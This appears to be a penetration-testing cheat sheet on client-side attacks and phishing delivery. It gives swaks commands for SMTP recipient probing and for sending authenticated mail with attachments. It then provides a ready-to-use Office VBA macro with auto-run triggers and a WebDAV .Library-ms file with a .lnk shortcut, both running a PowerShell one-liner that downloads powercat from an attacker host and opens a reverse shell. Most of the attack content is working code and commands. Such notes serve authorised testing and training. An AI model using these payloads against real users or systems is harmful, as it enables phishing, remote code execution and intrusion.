# Client-side attacks and phishing delivery

Related: [Mail enumeration](../enum/mail.md) · [Net-NTLM capture](../windows/ntlm-capture.md)

| Delivery path | Use when | Drop when |
| --- | --- | --- |
| [Office VBA](#office-vba-document) | Office installed, macro doc likely opened | Internet-origin macros blocked, attachment filtered |
| [WebDAV `.Library-ms` + `.lnk`](#webdav-library-and-shortcut) | User opens library, then shortcut | WebDAV unreachable, file blocked, no callback |
| [SMTP](#authenticated-smtp-delivery) | Accepted recipient + permitted sender/relay | Auth, recipient policy or attachment filter stops it |
| File-induced NTLM auth | Want Net-NTLM response, not code exec | Outbound SMB/HTTP blocked → [Net-NTLM capture](../windows/ntlm-capture.md) |

## Check the mail path first
Compare a candidate vs a nonexistent address **in the served domain**, with a valid `EHLO` name.

```bash
swaks --server <IP> --port 587 --tls \
  --from '<USER>@<DOMAIN.TLD>' --to '<RCPT>@<DOMAIN.TLD>' \
  --quit-after RCPT
```
```bash
# needs auth (530):
swaks --server <IP> --port 587 --tls \
  --auth LOGIN --auth-user '<USER>@<DOMAIN.TLD>' \
  --auth-password --protect-prompt --auth-hide-password \
  --from '<USER>@<DOMAIN.TLD>' --to '<RCPT>@<DOMAIN.TLD>' \
  --quit-after RCPT
```

| Reply | Meaning |
| --- | --- |
| `530` | Needs auth here → retry authenticated, repeat candidate vs control |
| `550 Unknown user` | Recipient rejected |
| `250` for candidate **and** nonsense control | No enumeration signal |
| `250` for external address | Relay rule, not proof of a local mailbox |

- `--quit-after RCPT` sends no message. `->` = client, `<-` = server: grep `<-` lines.
- Local vs external `MAIL FROM` can change the `RCPT` result: test both.

## Authenticated SMTP delivery
Start HTTP server + listener first.

```bash
swaks --server <IP> --port 587 --tls \
  --auth LOGIN --auth-user '<USER>@<DOMAIN.TLD>' \
  --auth-password --protect-prompt --auth-hide-password \
  --from '<USER>@<DOMAIN.TLD>' --to '<RCPT>@<DOMAIN.TLD>' \
  --h-Subject 'Requested document' --body 'Please review the attached file.' \
  --attach @/path/to/allowed-file
```
| Problem | Fix |
| --- | --- |
| `535` auth failed | Pass user/pw as plain text; don't pre-base64 them |
| `MAIL FROM` rejected after auth | Use the authenticated account's own address |
| No STARTTLS advertised | Drop `--tls` / use the port's real transport (465 = `--tlsc`) |
| Attachment arrives as literal text | Prefix the path with `@` |

- Final `250` after `DATA` = accepted, not delivered or opened. Confirm via a unique callback.

## Office VBA document
```bash
# serve powercat.ps1 from a staging dir
python3 -m http.server 8000 --directory /path/to/staging
nc -lvnp <PORT>
```
```bash
# UTF-16LE base64 for -EncodedCommand, split into VBA lines (run from repo root)
printf '%s' "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1');powercat -c <KALI> -p <PORT> -e powershell" \
  | iconv -f UTF-8 -t UTF-16LE | base64 -w0 | python3 scripts/vba_chunks.py
```
Standard module; paste the generated `cmd = cmd & "..."` lines; save as `.docm` (or `.doc`):

```vba
Public Sub RunPayload()
    Dim cmd As String
    cmd = ""
    ' Paste generated cmd = cmd & "..." lines here.
    CreateObject("WScript.Shell").Run cmd, 0
End Sub

Sub AutoOpen()
    RunPayload
End Sub
```
Alternative trigger, in `ThisDocument` (use one trigger only, or it runs twice):

```vba
Private Sub Document_Open()
    RunPayload
End Sub
```
- `vba_chunks.py` without a pipe prompts for the Base64. [Script](../scripts/vba_chunks.py)
- Internet-origin macros are blocked by default: if that policy applies, switch path.

## WebDAV library and shortcut
User opens `.Library-ms` → Explorer shows the WebDAV dir → user opens `.lnk`.

```bash
wsgidav --host=0.0.0.0 --port=80 --root=/path/to/webdav --auth=anonymous
```
`Documents.Library-ms`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation><url>http://<KALI>/</url></simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```
Build the `.lnk` on a Windows box, copy it into `/path/to/webdav` (powercat on :8000):

```powershell
$payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1');powercat -c <KALI> -p <PORT> -e powershell"
$lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\Review.lnk")
$lnk.TargetPath = 'powershell.exe'
$lnk.Arguments = '-NoProfile -Command "' + $payload + '"'
$lnk.Save()
```
Deliver the `.Library-ms` by mail or a writable share:

```text
smbclient //<IP>/<SHARE> -U <USER>
smb: \> put Documents.Library-ms
```
| Seen | Next |
| --- | --- |
| No WebDAV request | Reachability, client blocked the library |
| WebDAV hit, no callback | `.lnk` not opened, or command/egress blocked |

OAuth/SAML checks: [web auth page](../web/authentication.md).
